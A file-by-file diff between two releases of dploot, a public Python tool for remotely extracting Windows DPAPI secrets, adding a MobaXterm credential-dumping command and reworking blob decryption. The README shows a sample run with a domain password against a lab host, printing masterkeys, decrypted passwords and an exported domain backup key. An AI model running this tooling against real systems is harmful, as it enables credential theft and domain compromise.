# Comparing `tmp/dploot-2.6.2.tar.gz` & `tmp/dploot-2.7.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dploot-2.6.2.tar", max compression
+gzip compressed data, was "dploot-2.7.0.tar", max compression
```

## Comparing `dploot-2.6.2.tar` & `dploot-2.7.0.tar`

### file list

```diff
@@ -1,39 +1,41 @@
--rw-r--r--   0        0        0     1081 2024-03-07 17:48:20.612283 dploot-2.6.2/LICENSE
--rwxr-xr-x   0        0        0    30228 2024-03-07 14:31:27.130460 dploot-2.6.2/README.md
--rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/__init__.py
--rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/action/__init__.py
--rwxr-xr-x   0        0        0     3081 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/action/backupkey.py
--rwxr-xr-x   0        0        0     4530 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/browser.py
--rwxr-xr-x   0        0        0     4649 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/certificates.py
--rwxr-xr-x   0        0        0     4064 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/credentials.py
--rwxr-xr-x   0        0        0     4367 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/machinecertificates.py
--rwxr-xr-x   0        0        0     3810 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/machinecredentials.py
--rwxr-xr-x   0        0        0     3487 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/action/machinemasterkeys.py
--rwxr-xr-x   0        0        0     6098 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/machinetriage.py
--rwxr-xr-x   0        0        0     3732 2024-03-13 16:59:38.961736 dploot-2.6.2/dploot/action/machinevaults.py
--rwxr-xr-x   0        0        0     5543 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/masterkeys.py
--rwxr-xr-x   0        0        0     4602 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/rdg.py
--rwxr-xr-x   0        0        0     3920 2024-03-20 10:31:46.018629 dploot-2.6.2/dploot/action/sccm.py
--rwxr-xr-x   0        0        0     7886 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/triage.py
--rwxr-xr-x   0        0        0     3964 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/action/vaults.py
--rwxr-xr-x   0        0        0     3798 2024-03-13 16:59:21.925855 dploot-2.6.2/dploot/action/wifi.py
--rwxr-xr-x   0        0        0     1936 2024-03-13 17:08:15.522132 dploot-2.6.2/dploot/entry.py
--rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/lib/__init__.py
--rwxr-xr-x   0        0        0    11632 2024-03-20 10:35:23.433415 dploot-2.6.2/dploot/lib/crypto.py
--rwxr-xr-x   0        0        0     9863 2024-03-20 10:35:36.749336 dploot-2.6.2/dploot/lib/dpapi.py
--rwxr-xr-x   0        0        0     9333 2024-03-13 17:15:33.555452 dploot-2.6.2/dploot/lib/smb.py
--rwxr-xr-x   0        0        0     5594 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/lib/target.py
--rwxr-xr-x   0        0        0     1905 2024-03-20 10:34:58.337564 dploot-2.6.2/dploot/lib/utils.py
--rw-r--r--   0        0        0     1867 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/lib/wmi.py
--rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/triage/__init__.py
--rwxr-xr-x   0        0        0     3068 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/triage/backupkey.py
--rwxr-xr-x   0        0        0    10855 2024-03-13 16:53:02.472508 dploot-2.6.2/dploot/triage/browser.py
--rwxr-xr-x   0        0        0    13084 2024-03-20 10:33:31.578062 dploot-2.6.2/dploot/triage/certificates.py
--rwxr-xr-x   0        0        0     6500 2024-03-07 14:31:27.130460 dploot-2.6.2/dploot/triage/credentials.py
--rwxr-xr-x   0        0        0     9431 2024-03-07 14:31:27.134460 dploot-2.6.2/dploot/triage/masterkeys.py
--rwxr-xr-x   0        0        0     8599 2024-03-07 14:31:27.134460 dploot-2.6.2/dploot/triage/rdg.py
--rwxr-xr-x   0        0        0     9479 2024-03-13 17:15:46.691380 dploot-2.6.2/dploot/triage/sccm.py
--rwxr-xr-x   0        0        0     9179 2024-03-20 10:32:33.930377 dploot-2.6.2/dploot/triage/vaults.py
--rwxr-xr-x   0        0        0     9425 2024-03-13 17:16:21.995184 dploot-2.6.2/dploot/triage/wifi.py
--rw-r--r--   0        0        0      901 2024-03-20 10:36:38.784958 dploot-2.6.2/pyproject.toml
--rw-r--r--   0        0        0    31170 1970-01-01 00:00:00.000000 dploot-2.6.2/PKG-INFO
+-rw-r--r--   0        0        0     1081 2024-03-07 17:48:20.612283 dploot-2.7.0/LICENSE
+-rwxr-xr-x   0        0        0    31228 2024-04-02 15:39:26.758687 dploot-2.7.0/README.md
+-rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/__init__.py
+-rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/action/__init__.py
+-rwxr-xr-x   0        0        0     3081 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/action/backupkey.py
+-rwxr-xr-x   0        0        0     4530 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/browser.py
+-rwxr-xr-x   0        0        0     4649 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/certificates.py
+-rwxr-xr-x   0        0        0     4064 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/credentials.py
+-rwxr-xr-x   0        0        0     4367 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/machinecertificates.py
+-rwxr-xr-x   0        0        0     3810 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/machinecredentials.py
+-rwxr-xr-x   0        0        0     3487 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/action/machinemasterkeys.py
+-rwxr-xr-x   0        0        0     6098 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/machinetriage.py
+-rwxr-xr-x   0        0        0     3732 2024-03-13 16:59:38.961736 dploot-2.7.0/dploot/action/machinevaults.py
+-rwxr-xr-x   0        0        0     5543 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/masterkeys.py
+-rw-r--r--   0        0        0     3382 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/action/mobaxterm.py
+-rwxr-xr-x   0        0        0     4602 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/rdg.py
+-rwxr-xr-x   0        0        0     3920 2024-03-20 10:31:46.018629 dploot-2.7.0/dploot/action/sccm.py
+-rwxr-xr-x   0        0        0     7886 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/triage.py
+-rwxr-xr-x   0        0        0     3964 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/action/vaults.py
+-rwxr-xr-x   0        0        0     3798 2024-03-13 16:59:21.925855 dploot-2.7.0/dploot/action/wifi.py
+-rwxr-xr-x   0        0        0     1966 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/entry.py
+-rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/lib/__init__.py
+-rwxr-xr-x   0        0        0    11632 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/lib/crypto.py
+-rwxr-xr-x   0        0        0    10269 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/lib/dpapi.py
+-rwxr-xr-x   0        0        0     9333 2024-03-13 17:15:33.555452 dploot-2.7.0/dploot/lib/smb.py
+-rwxr-xr-x   0        0        0     5594 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/lib/target.py
+-rwxr-xr-x   0        0        0     1905 2024-03-20 10:34:58.337564 dploot-2.7.0/dploot/lib/utils.py
+-rw-r--r--   0        0        0     1867 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/lib/wmi.py
+-rw-r--r--   0        0        0        0 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/triage/__init__.py
+-rwxr-xr-x   0        0        0     3068 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/triage/backupkey.py
+-rwxr-xr-x   0        0        0    10855 2024-03-13 16:53:02.472508 dploot-2.7.0/dploot/triage/browser.py
+-rwxr-xr-x   0        0        0    13166 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/triage/certificates.py
+-rwxr-xr-x   0        0        0     6500 2024-03-07 14:31:27.130460 dploot-2.7.0/dploot/triage/credentials.py
+-rwxr-xr-x   0        0        0     9556 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/triage/masterkeys.py
+-rw-r--r--   0        0        0    16671 2024-04-02 15:39:26.758687 dploot-2.7.0/dploot/triage/mobaxterm.py
+-rwxr-xr-x   0        0        0     8599 2024-03-07 14:31:27.134460 dploot-2.7.0/dploot/triage/rdg.py
+-rwxr-xr-x   0        0        0     9479 2024-03-13 17:15:46.691380 dploot-2.7.0/dploot/triage/sccm.py
+-rwxr-xr-x   0        0        0     9179 2024-03-20 10:32:33.930377 dploot-2.7.0/dploot/triage/vaults.py
+-rwxr-xr-x   0        0        0     9425 2024-03-13 17:16:21.995184 dploot-2.7.0/dploot/triage/wifi.py
+-rw-r--r--   0        0        0      901 2024-04-02 15:39:48.794737 dploot-2.7.0/pyproject.toml
+-rw-r--r--   0        0        0    32170 1970-01-01 00:00:00.000000 dploot-2.7.0/PKG-INFO
```

### Comparing `dploot-2.6.2/LICENSE` & `dploot-2.7.0/LICENSE`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/README.md` & `dploot-2.7.0/README.md`

 * *Files 2% similar despite different names*

```diff
@@ -30,14 +30,15 @@
       - [machinevaults](#machinevaults)
       - [machinecertificates](#machinecertificates)
       - [machinetriage](#machinetriage)
     - [Misc](#misc)
       - [wifi](#wifi)
       - [sccm](#sccm)
       - [backupkey](#backupkey)
+      - [mobaxterm](#mobaxterm)
   - [Credits](#credits)
   - [TODO](#TODO)
 
 ## Installation
 
 You can install dploot directly from PyPI:
 
@@ -711,14 +712,41 @@
 cbPvk: {1172}
 PRIVATEKEYBLOB:{1ef1b5b000000000010000000000000000000000940400000702000000a4000052534132000800000100010081a511b5e41ad9563aff9f591ba61bec76ba09859750b0bcbeff2ef26f06b1a85b6b763623249890587cee80495ad02c3c1554abf9eb472da753531186d1a58dc853ac85a31dc14348a477b1555e8f882a3c4543098896fe7523dabbfed2bda09a9cf86fdc017bb86375eec8058953193a58f8896c0c6f622da40cfee5f4734b07458176c3aa8ff1cbe3eaf6faa97d774c68f82b59a635d2e671d5e658bab75f7e6ca2d9c04bb5bf2aa18b13cb4b18951be73f0ec16e3e5d8e8caee9ab26d44e365b3669ccb03c1f2d25f24f6a7f2ac116975a9b58662c1aed40af1d0277b78dab978de25f7aaf09596b869fa5b7762c7f63b5ad0b8611826f79e37a252123f06f4cd136b5919607c768ebe59e1001952ae9bb74bb4462ffb5059473b836d8ca287bc0c01653d28da74798be1c867d364158d8fc3acbe287efe88ea24359b7cffa5b02fd61840a6b786ba33cf842e80231ded169eeb6bc582cb174a17f4dfdf25e7fdcd399f6dab6b62e91cdebaa882797b449bd591a5e189bc86ffc535771f60f05b0e4136d6e64c33adbd572e0c83b7762b0b5e81f36a9bc41c0445c652ddd4012d92839806a594af1b2abf392cbe052f585a69565d8ef23df0df41fdafbaa587cdda27c7a818590d48b75672c6459dc7a865fb69eaa0243c988d6a512bf2c6e24ddfdd1025a588a128cf981f2ed9370781b0f1a0c6ff1f4cccf22163073f9457f91d7fa2bd412bd8ce8d595ed1df2ea2ca1b9f02f0edba7a07ffddb81a6f2847a54ba0b1b8a6f78df0f5f2b29a347ce9b7b6f59e50c3828bfdefbba442f171c4c334c85ab7db48c6e4fd9acbd7d97e2ef59c56ad171b152c600977f6a19d8548ce931035995b5a3f6f70e2a4ac39ab071e39f8235ec3f238ac0017f71cbc4f52891d47ebb5114be9417a8d6a811a5c07025aa223fc6ac3dee729762ff1b34dab65cdce2a69887122d86054a03224fe9e982ad1071840ecdd18ebe3fc3eafa242d4a7bb917282fc2f157c6a9acef01871f70887e31e5b272fd20f39cf0256d96dde7f5380afca01917e57d04d11efa2e39051ca87ab61fd13e07555c8ab1137a8d916202ccd99b70c8ed080188fbf6691d621309441ac407865f985e44c5a2876a33f72a2bdef444b65d087eb150d8e83e9dc2eac198f0f3b9da26a32f2ba4d6b448ab4437778b74ecff7e94aae1020b2773469f80021ec4baaa202d859a21da601f3eff77b599f2249cc2e92019b97defbd2786599a9c331032db72356daec1236f703a6649aa5bc3eeef57177d9bb08d00844a573eb8fc356a36ffda43b2d790836a00fe632b124f280925bc13f1e60326ef0da237f2aaae721c0ffec02b84d09fe9f59d6aa68d19c61c9a794a0746ebe0d03af7563efa7ffef80462d10e30d65f2a9a75f44eba7b5222cffc49f331dc9f74bca51819e2b061ac558cc397bbf42e94ccb39625a584deb549eaf34dcfc2ecd9c9c0b0c2f65d4b6966d9e60a7a1c17c1848e7c7d7d4cd0054ad78a4991dbc8771aba7f26058fef848fd49fff622eed23e0dfcb453e178c189ae609cdb1aa2b1e4d4a8182c6dcd735581690d6fb52e5bddff1b37419cad1f84921235d5fa1e192c71bbada85527a14e7e06c53}
 
 
 [-] Exporting domain backupkey to file key.pvk
 ```
 
+### mobaxterm
+
+The **mobaxterm** command will extract MobaXterm secrets and masterpassword key from hive (HKU) and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys. If the user is not connected on the remote target, dploot will download and extract secrets from NTUSER.dat. 
+
+With `pvk`:
+
+```text
+dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage ALL USERS masterkeys
+
+{6dedb662-3f3c-43a7-bfc4-e2990a48d4dd}:32c4eeeac475910a33f531b56cf9d73f35490d5e
+{21f17bcd-eac1-4187-9538-a744f2c6e17b}:198eba83e088a59fd75e6435b38804d4973a2c1e
+
+[*] Triage MobaXterm Secrets
+
+[MOBAXTERM CREDENTIAL]
+Name:		TEST
+Username:	user
+Password:	waza1234
+
+[MOBAXTERM PASSWORD]
+Username:	mobauser@mobaserver
+Password:	309554moba231082pass322883
+```
+
 ## Credits
 
 Those projects helped a lot in writting this tool:
 
 - [Impacket](https://github.com/SecureAuthCorp/impacket) by the community
 - [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by [Harmj0y](https://twitter.com/harmj0y)
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
```

### Comparing `dploot-2.6.2/dploot/action/backupkey.py` & `dploot-2.7.0/dploot/action/backupkey.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/browser.py` & `dploot-2.7.0/dploot/action/browser.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/certificates.py` & `dploot-2.7.0/dploot/action/certificates.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/credentials.py` & `dploot-2.7.0/dploot/action/credentials.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/machinecertificates.py` & `dploot-2.7.0/dploot/action/machinecertificates.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/machinecredentials.py` & `dploot-2.7.0/dploot/action/machinecredentials.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/machinemasterkeys.py` & `dploot-2.7.0/dploot/action/machinemasterkeys.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/machinetriage.py` & `dploot-2.7.0/dploot/action/machinetriage.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/machinevaults.py` & `dploot-2.7.0/dploot/action/machinevaults.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/masterkeys.py` & `dploot-2.7.0/dploot/action/masterkeys.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/rdg.py` & `dploot-2.7.0/dploot/action/rdg.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/sccm.py` & `dploot-2.7.0/dploot/action/sccm.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/triage.py` & `dploot-2.7.0/dploot/action/triage.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/vaults.py` & `dploot-2.7.0/dploot/action/vaults.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/action/wifi.py` & `dploot-2.7.0/dploot/action/wifi.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/entry.py` & `dploot-2.7.0/dploot/entry.py`

 * *Files 5% similar despite different names*

```diff
@@ -18,14 +18,15 @@
     machinemasterkeys,
     machinecredentials,
     machinevaults,
     machinecertificates,
     machinetriage,
     browser,
     wifi,
+    mobaxterm,
     )
 
 
 ENTRY_PARSERS = [
     certificates,
     credentials,
     masterkeys,
@@ -37,14 +38,15 @@
     machinemasterkeys,
     machinecredentials,
     machinevaults,
     machinecertificates,
     machinetriage,
     browser,
     wifi,
+    mobaxterm,
 ]
 
 def main() -> None:
     logger.init()
     version = importlib.metadata.version("dploot")
     parser = argparse.ArgumentParser(description=f"DPAPI looting remotely in Python.\nVersion {version}", add_help=True)
```

### Comparing `dploot-2.6.2/dploot/lib/crypto.py` & `dploot-2.7.0/dploot/lib/crypto.py`

 * *Ordering differences only*

 * *Files 0% similar despite different names*

```diff
@@ -238,21 +238,21 @@
         cipher = AES.new(aeskey, AES.MODE_GCM, iv)
         decrypted = cipher.decrypt(payload)[:-16]
         decrypted = decrypted.decode('utf-8')
         return decrypted or None
 
 def deriveKeysFromUser(sid, password):
     password = password.encode('utf-16le')
-    sid = sid.encode('utf-16le')
     z_sid = (sid + '\0').encode('utf-16le')
     password_md4 = MD4.new(password).digest()
     # Will generate two keys, one with SHA1 and another with MD4
     key1 = HMAC.new(SHA1.new(password).digest(), z_sid, SHA1).digest()
     key2 = HMAC.new(password_md4, z_sid, SHA1).digest()
     # For Protected users
+    sid = sid.encode('utf-16le')
     tmpKey = pbkdf2_hmac('sha256', password_md4, sid, 10000)
     tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid, 1)[:16]
     key3 = HMAC.new(tmpKey2, z_sid, SHA1).digest()[:20]
 
     return key1, key2, key3
 
 def deriveKeysFromUserkey(sid, nthash):
```

### Comparing `dploot-2.6.2/dploot/lib/dpapi.py` & `dploot-2.7.0/dploot/lib/dpapi.py`

 * *Files 4% similar despite different names*

```diff
@@ -194,64 +194,64 @@
     return find_masterkey(masterkey=masterkey, masterkeys=masterkeys)
 
 def decrypt_blob(blob_bytes:bytes, masterkey:Any, entropy = None) -> Any:
     blob = DPAPI_BLOB(blob_bytes)
     key = unhexlify(masterkey.sha1)
     decrypted = None
     if entropy is not None:
-        decrypted = blob.decrypt(blob, key, entropy=entropy)
+        decrypted = decrypt(blob, key, entropy=entropy)
     else:
         decrypted = decrypt(blob, key)
     return decrypted
 
 def decrypt(blob, keyHash, entropy = None) -> "bytes | None":
     hash_algo = ALGORITHMS_DATA[blob['HashAlgo']][1]
-    sessionKey = HMAC.new(keyHash, blob['Salt'], hash_algo)
-    if entropy is not None:
-        sessionKey.update(entropy)
-
-    sessionKey = sessionKey.digest()
-
-    # Derive the key
-    derivedKey = blob.deriveKey(sessionKey)
-
-    crypto = ALGORITHMS_DATA[blob['CryptAlgo']]
-    cipher = crypto[1].new(derivedKey[:crypto[0]], mode=crypto[2], iv=b'\x00'*crypto[3])
-    cleartext = unpad(cipher.decrypt(blob['Data']), crypto[1].block_size)
-
-    # Now check the signature
-
-    # ToDo Fix this, it's just ugly, more testing so we can remove one
-    toSign = (blob.rawData[20:][:len(blob.rawData)-20-len(blob['Sign'])-4])
-
-    # Calculate the different HMACKeys
     block_size = hash_algo.block_size
-    pad_block = keyHash.ljust(block_size, b'\x00')
+    for algo in [compute_sessionKey_1, compute_sessionKey_2]:
+        sessionKey = algo(keyHash, blob['Salt'], hash_algo, block_size, entropy)
+        sessionKey = sessionKey.digest()
+        derivedKey = blob.deriveKey(sessionKey)  
+        crypto = ALGORITHMS_DATA[blob['CryptAlgo']]
+        cipher = crypto[1].new(derivedKey[:crypto[0]], mode=crypto[2], iv=b'\x00'*crypto[3])
+        cleartext = cipher.decrypt(blob['Data'])
+        try:
+            cleartext = unpad(cleartext, crypto[1].block_size)
+        except ValueError as e:
+            if "Padding is incorrect" in str(e):
+                pass
+        # Now check the signature
+        # ToDo Fix this, it's just ugly, more testing so we can remove one
+        toSign = (blob.rawData[20:][:len(blob.rawData)-20-len(blob['Sign'])-4])
+        hmac_calculated = algo(keyHash, blob['HMac'], hash_algo, block_size, entropy)
+        hmac_calculated.update(toSign)
+        if blob['Sign'] == hmac_calculated.digest():
+            return cleartext
+    return None
+
+def compute_sessionKey_1(key_hash: bytes, salt: bytes, hash_algo: object, block_size: int, entropy: bytes):
+    pad_block = key_hash.ljust(block_size, b'\x00')
     ipad = bytearray(i ^ 0x36 for i in pad_block)
     opad = bytearray(i ^ 0x5c for i in pad_block)
+
     a = hash_algo.new(ipad)
-    a.update(blob['HMac'])
+    a.update(salt)
 
-    hmacCalculated1 = hash_algo.new(opad)
-    hmacCalculated1.update(a.digest())
+    computed_key = hash_algo.new(opad)
+    computed_key.update(a.digest())
 
     if entropy is not None:
-        hmacCalculated1.update(entropy)
-
-    hmacCalculated1.update(toSign)
+        computed_key.update(entropy)
+    return computed_key
 
-    hmacCalculated3 = HMAC.new(keyHash, blob['HMac'], hash_algo)
+def compute_sessionKey_2(key_hash: bytes, salt: bytes, hash_algo: object, block_size: int, entropy: bytes):
+    computed_key = HMAC.new(key_hash, salt, hash_algo)
     if entropy is not None:
-        hmacCalculated3.update(entropy)
-
-    hmacCalculated3.update(toSign)
-
-    if blob['Sign'] in (hmacCalculated1.digest(), hmacCalculated3.digest()):
-        return cleartext
-    return None
+        computed_key.update(entropy)
+    
+    return computed_key
 
 def find_masterkey_for_blob(blob_bytes:bytes, masterkeys: Any) -> "Any | None":
     blob = DPAPI_BLOB(blob_bytes)
     masterkey = bin_to_string(blob['GuidMasterKey'])
     return find_masterkey(masterkey=masterkey, masterkeys=masterkeys)
 
 def find_masterkey(masterkey: str, masterkeys: Any) -> "Any | None":
```

### Comparing `dploot-2.6.2/dploot/lib/smb.py` & `dploot-2.7.0/dploot/lib/smb.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/lib/target.py` & `dploot-2.7.0/dploot/lib/target.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/lib/utils.py` & `dploot-2.7.0/dploot/lib/utils.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/lib/wmi.py` & `dploot-2.7.0/dploot/lib/wmi.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/backupkey.py` & `dploot-2.7.0/dploot/triage/backupkey.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/browser.py` & `dploot-2.7.0/dploot/triage/browser.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/certificates.py` & `dploot-2.7.0/dploot/triage/certificates.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,14 +1,15 @@
 import hashlib
 import logging
 import ntpath
 from typing import Dict, List, Tuple
 from dataclasses import dataclass
 
 from impacket.dcerpc.v5 import rrp
+from impacket.system_errors import ERROR_NO_MORE_ITEMS
 
 from Cryptodome.PublicKey import RSA
 from cryptography import x509
 from cryptography.hazmat._oid import ExtensionOID
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
 from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12, PublicFormat, load_der_private_key
@@ -95,26 +96,29 @@
         my_certificates_key = 'SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates'
         ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
         regHandle = ans['phKey']
         certificate_keys = []
         certificates = {}
         ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, my_certificates_key, samDesired=rrp.KEY_ENUMERATE_SUB_KEYS)
         keyHandle = ans['phkResult']
-        try:
-            for index in range(100):
-                enum_ans = rrp.hBaseRegEnumKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, index)
+        i = 0
+        while True:
+            try:
+                enum_ans = rrp.hBaseRegEnumKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, i)
                 certificate_keys.append(enum_ans['lpNameOut'][:-1])
-            rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
-        except rrp.DCERPCSessionError as e:
-            if e.error_code == 0x00000103:
-                pass
-            elif logging.getLogger().level == logging.DEBUG:
-                    import traceback
-                    traceback.print_exc()
-                    logging.debug(str(e))
+                i += 1
+            except rrp.DCERPCSessionError as e:
+                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
+                    break
+            except Exception as e:
+                import traceback
+                traceback.print_exc()
+                logging.error(str(e))
+        rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
+                    
         for certificate_key in certificate_keys:
             try:
                 regKey = my_certificates_key + '\\' + certificate_key
                 ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
                 keyHandle = ans['phkResult']
                 _, certblob_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'Blob')
                 logging.debug("Found Certificates Blob: \\\\%s\\%s" %  (self.target.address,regKey))
```

### Comparing `dploot-2.6.2/dploot/triage/credentials.py` & `dploot-2.7.0/dploot/triage/credentials.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/masterkeys.py` & `dploot-2.7.0/dploot/triage/masterkeys.py`

 * *Files 5% similar despite different names*

```diff
@@ -102,16 +102,18 @@
 
     def triage_masterkeys(self) -> List[Masterkey]:
         masterkeys = list()
         for user in self.users:
             try:
                 masterkeys += self.triage_masterkeys_for_user(user)
             except Exception as e:
-                logging.debug(str(e))
-                pass
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                    logging.debug(str(e))
         return masterkeys
             
     def triage_masterkeys_for_user(self, user:str) -> List[Masterkey]:
         masterkeys = list()
         user_masterkey_path = ntpath.join(ntpath.join('Users', user),self.user_masterkeys_generic_path)
         user_protect_dir = self.conn.remote_list_dir(self.share, path=user_masterkey_path)
         if user_protect_dir is None: # Yes, it's possible that users have an AppData tree but no Protect folder
```

### Comparing `dploot-2.6.2/dploot/triage/rdg.py` & `dploot-2.7.0/dploot/triage/rdg.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/sccm.py` & `dploot-2.7.0/dploot/triage/sccm.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/vaults.py` & `dploot-2.7.0/dploot/triage/vaults.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/dploot/triage/wifi.py` & `dploot-2.7.0/dploot/triage/wifi.py`

 * *Files identical despite different names*

### Comparing `dploot-2.6.2/pyproject.toml` & `dploot-2.7.0/pyproject.toml`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "dploot"
-version = "2.6.2"
+version = "2.7.0"
 description = "DPAPI looting remotely in Python"
 readme = "README.md"
 homepage = "https://github.com/zblurx/dploot"
 repository = "https://github.com/zblurx/dploot"
 keywords = ["DPAPI", "credentials", "Windows"]
 authors = ["zblurx <seigneuret.thomas@protonmail.com>"]
 license = "MIT"
```

### Comparing `dploot-2.6.2/PKG-INFO` & `dploot-2.7.0/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: dploot
-Version: 2.6.2
+Version: 2.7.0
 Summary: DPAPI looting remotely in Python
 Home-page: https://github.com/zblurx/dploot
 License: MIT
 Keywords: DPAPI,credentials,Windows
 Author: zblurx
 Author-email: seigneuret.thomas@protonmail.com
 Requires-Python: >=3.7,<4.0
@@ -56,14 +56,15 @@
       - [machinevaults](#machinevaults)
       - [machinecertificates](#machinecertificates)
       - [machinetriage](#machinetriage)
     - [Misc](#misc)
       - [wifi](#wifi)
       - [sccm](#sccm)
       - [backupkey](#backupkey)
+      - [mobaxterm](#mobaxterm)
   - [Credits](#credits)
   - [TODO](#TODO)
 
 ## Installation
 
 You can install dploot directly from PyPI:
 
@@ -737,14 +738,41 @@
 cbPvk: {1172}
